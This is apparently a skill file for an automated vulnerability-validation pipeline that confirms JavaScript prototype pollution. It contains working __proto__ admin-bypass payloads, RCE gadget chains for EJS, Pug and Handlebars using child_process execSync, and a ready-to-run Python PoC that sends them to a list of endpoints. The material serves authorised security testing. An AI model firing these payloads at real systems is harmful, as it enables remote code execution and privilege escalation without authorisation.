---
name: validate-prototype-pollution
description: >
  Validate JavaScript/TypeScript prototype pollution vulnerabilities by injecting
  __proto__ manipulation payloads and verifying Object.prototype modification or
  downstream code execution. JS/TS-specific; only applicable to Node.js targets.
origin: vuln-analysis
language: javascript,typescript
---

# Validator: Prototype Pollution (JavaScript / TypeScript)

Confirm whether a JavaScript/Node.js application allows user-controlled input to
pollute `Object.prototype`, potentially leading to privilege escalation or RCE.

## When to Activate

- A `prototype_pollution` vulnerability needs validation (Step 7/8)
- **Target language MUST be JavaScript or TypeScript** — prototype chains are a
  JS/TS-only concept
- Only activate when `target.json.language` is `"javascript"` or `"typescript"`

## What is Prototype Pollution?

JavaScript objects inherit properties from `Object.prototype`. If an attacker can
inject keys like `__proto__`, `constructor`, or `prototype` into a deep merge or
object assignment operation, they can add arbitrary properties to ALL objects in
the application.

**Attack input**: `{"__proto__": {"admin": true}}` or as query param: `?__proto__[admin]=true`

**Impact tiers**:
1. **Privilege escalation** — `__proto__.isAdmin = true` bypasses authorization checks
2. **Property injection** — `__proto__.outputFunctionName = "x; process.mainModule.require('child_process').execSync('id > /tmp/pp_flag')//"` → RCE in template engines
3. **DoS** — `__proto__.toString = null` breaks all object string coercion

**Real-world gadget chains for RCE**:
- Pug/Jade template engine: `__proto__.block = {"type": "Text", "line": "process.mainModule.require('child_process').execSync(...)"}`
- Handlebars: `__proto__.pending = true` + `__proto__.type = "constructor"` + `__proto__.fn = "process.mainModule.require('child_process').execSync(...)"`
- EJS: `__proto__.outputFunctionName = "x; process.mainModule.require('child_process').execSync('id > /tmp/flag')//"` → RCE when template renders

## No External Infrastructure Required

Prototype pollution validation only requires:
1. HTTP requests to inject the payload
2. HTTP requests to verify the polluted property is reflected or causes behavior change
3. For RCE via template gadget: check for marker file `/tmp/pp_rce_<id>`

## Validation Technique

### Step 1: Inject Prototype Pollution Payloads

Try multiple injection vectors:

```python
import secrets, time
PP_MARKER = secrets.token_hex(8)
PP_FLAG_FILE = f"/tmp/pp_rce_{PP_MARKER}"

# JSON body injection (most common)
JSON_PAYLOADS = [
    # Admin bypass check
    {"__proto__": {"admin": True, "isAdmin": True, "role": "admin"}},
    # RCE via EJS outputFunctionName gadget
    {"__proto__": {
        "outputFunctionName": f"x; require('child_process').execSync('echo {PP_MARKER} > {PP_FLAG_FILE}')//",
    }},
    # RCE via pug/jade block gadget
    {"__proto__": {
        "block": {
            "type": "Text",
            "line": f"process.mainModule.require('child_process').execSync('echo {PP_MARKER} > {PP_FLAG_FILE}')"
        }
    }},
]

# Query parameter injection (works with qs, querystring parsers)
QUERY_PAYLOADS = [
    f"__proto__[admin]=true&__proto__[isAdmin]=true",
    f"constructor[prototype][admin]=true",
]

# URL-encoded nested payload
NESTED_PAYLOADS = [
    f"a[__proto__][admin]=true",
    f"a[constructor][prototype][admin]=true",
]
```

### Step 2: Verify Pollution Took Effect

After injecting, send a second request that reveals whether `Object.prototype` was modified:

```python
def check_prototype_polluted(target, timeout, marker):
    """Probe endpoints that may reflect prototype properties."""
    probe_urls = [
        f"{target}/api/profile",   # returns user object (may include prototype props)
        f"{target}/api/whoami",    # returns role/admin status
        f"{target}/dashboard",     # admin panel — would return 200 if admin=true worked
        f"{target}/admin",         # admin access check
    ]
    for url in probe_urls:
        try:
            resp = requests.get(url, timeout=timeout)
            if (
                '"admin":true' in resp.text or
                '"isAdmin":true' in resp.text or
                '"role":"admin"' in resp.text or
                marker in resp.text
            ):
                return url, resp.text[:300]
        except Exception:
            continue
    return None, None
```

### Step 3: Check for RCE via Gadget

```python
import os, time

def check_rce_marker(flag_file, wait_seconds=2):
    """Wait briefly for async gadget execution, then check marker file."""
    time.sleep(wait_seconds)
    return os.path.exists(flag_file)
```

### Step 4: Evidence Hierarchy

| Evidence | Confidence | Action |
|----------|-----------|--------|
| Marker file `/tmp/pp_rce_<id>` exists | 10/10 | CONFIRMED — full RCE |
| `PP_CONFIRMED` in PoC output | 9/10 | CONFIRMED |
| Admin endpoint returns 200 after `__proto__.admin=true` injection | 8/10 | CONFIRMED — privilege escalation |
| Prototype property reflected in API response | 7/10 | CONFIRMED — property injection |
| Template engine error referencing `__proto__` properties | 6/10 | PARTIAL |
| No behavior change | — | NOT_REPRODUCED |

## Legitimacy Check (Anti-Cheat)

Scan PoC script. Mark `[INVALID]` if:

```python
# FORBIDDEN — directly setting Object.prototype in Node.js subprocess
subprocess.run(["node", "-e", "Object.prototype.x=1"])  # INVALID
eval("Object.prototype.admin = true")  # INVALID — doesn't go through target app

# CORRECT — injecting via HTTP and observing effect through target app
requests.post(f"{target}/api/merge", json={"__proto__": {"admin": True}})  # VALID
```

## Static Analysis Patterns (JavaScript/TypeScript)

| Pattern | Risk | Notes |
|---------|------|-------|
| `_.merge(target, userInput)` (lodash) | HIGH | Deep merge allows `__proto__` key |
| `deepmerge(a, b)` where `b` is user-controlled | HIGH | Recursive merge, `__proto__` traversal |
| `Object.assign(target, userInput)` | MEDIUM | Shallow assign; only affects target's direct keys — usually safe |
| `JSON.parse(userInput)` + recursive spread: `{...parsed}` | HIGH | If spread into objects that do `.hasOwnProperty` checks |
| `qs.parse(query, {allowPrototypes: true})` | CRITICAL | qs library with dangerous option |
| `querystring.parse(str)` on untrusted input | MEDIUM | Built-in, no prototype traversal by default |
| `req.body[key] = value` with user-controlled `key` containing `__proto__` | HIGH | Manual property assignment |
| `extend(true, {}, userInput)` (jQuery-style) | HIGH | Deep extend with user input |

**Search commands**:
```bash
# Find deep merge operations
grep -rn "\.merge\|deepmerge\|extend(true\|deepClone" --include="*.js" --include="*.ts" | grep -v "test\|spec"

# Find Object.assign with external data
grep -rn "Object\.assign\|Object\.setPrototypeOf" --include="*.js" | grep "req\.\|body\.\|param\."

# Find qs/query-string parsing
grep -rn "qs\.parse\|querystring\.parse\|query-string" --include="*.js" --include="*.ts"
```

## PoC Template

```python
#!/usr/bin/env python3
"""PoC for <VULN_ID>: prototype_pollution — Prototype Pollution via <merge_function>"""
import argparse, sys, time, os, secrets
import requests

PP_MARKER = secrets.token_hex(8)
PP_FLAG_FILE = f"/tmp/pp_rce_{PP_MARKER}"

# Try RCE via EJS template gadget first, then fall back to privilege escalation check
PAYLOADS = [
    {
        # EJS gadget chain → RCE
        "__proto__": {
            "outputFunctionName": f"x; require('child_process').execSync('echo {PP_MARKER} > {PP_FLAG_FILE}')//",
        }
    },
    {
        # Admin privilege bypass
        "__proto__": {"admin": True, "isAdmin": True, "role": "admin", "authorized": True}
    },
    {
        # Nested via constructor
        "constructor": {"prototype": {"admin": True, "isAdmin": True}}
    },
]

INJECT_ENDPOINTS = [
    ("POST", "/api/merge"),
    ("POST", "/api/extend"),
    ("POST", "/api/deep-copy"),
    ("POST", "/api/update"),
    ("POST", "/api/settings"),
    ("PUT", "/api/profile"),
]

def exploit(target, timeout):
    for payload in PAYLOADS:
        for method, path in INJECT_ENDPOINTS:
            try:
                if method == "POST":
                    resp = requests.post(f"{target}{path}", json=payload, timeout=timeout)
                else:
                    resp = requests.put(f"{target}{path}", json=payload, timeout=timeout)

                # Check for RCE via gadget
                time.sleep(1)
                if os.path.exists(PP_FLAG_FILE):
                    return {
                        "method": "rce_via_gadget",
                        "endpoint": path,
                        "marker": PP_FLAG_FILE,
                        "payload": str(payload)[:100],
                    }

                # Check for privilege escalation
                probe = requests.get(f"{target}/api/profile", timeout=timeout)
                if any(x in probe.text for x in ['"admin":true', '"isAdmin":true', '"role":"admin"']):
                    return {
                        "method": "privilege_escalation",
                        "endpoint": path,
                        "evidence": probe.text[:200],
                    }

            except Exception:
                continue
    return None

def validate(result):
    return result is not None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    print(f"[*] PP marker: {PP_MARKER}")

    start = time.time()
    try:
        result = exploit(args.target, args.timeout)
        elapsed = time.time() - start
        if validate(result):
            status_msg = f"{result['method']} via {result['endpoint']}"
            print(f"[CONFIRMED] VULN_ID prototype_pollution — {status_msg} in {elapsed:.2f}s")
            sys.exit(0)
        else:
            print(f"[NOT_REPRODUCED] VULN_ID prototype_pollution — no effect in {elapsed:.2f}s")
            sys.exit(1)
    except Exception as e:
        print(f"[ERROR] VULN_ID — {e}")
        sys.exit(2)

if __name__ == "__main__":
    main()
```

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[SUCCESS]** | Marker file created (RCE via gadget) OR admin access confirmed after `__proto__.admin=true` injection |
| **[PARTIAL]** | Prototype property reflected in response but no behavior change confirmed |
| **[FAILED]** | No pollution effect detected |
| **[INVALID]** | PoC sets `__proto__` directly in Node.js subprocess rather than through target app |

## CVSS Reference

| Scenario | Vector | Score |
|----------|--------|-------|
| RCE via template gadget (unauthenticated) | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | 8.1 (HIGH) |
| Privilege escalation (unauthenticated) | `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N` | 6.5 (MEDIUM) |
| RCE via gadget (authenticated) | `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` | 7.5 (HIGH) |

## Output: Write to results.json

```json
{
  "vuln_id": "VULN-001",
  "type": "prototype_pollution",
  "poc_script": "poc_scripts/poc_prototype_pollution_001.py",
  "status": "SUCCESS",
  "exit_code": 0,
  "retries": 0,
  "entry_point_used": "POST /api/merge",
  "validation_result": {
    "marker": "CONFIRMED",
    "evidence": "Prototype pollution RCE via EJS gadget: marker file /tmp/pp_rce_a1b2c3d4e5f6a1b2 created after injecting {\"__proto__\":{\"outputFunctionName\":\"...\"}} into POST /api/merge"
  }
}
```
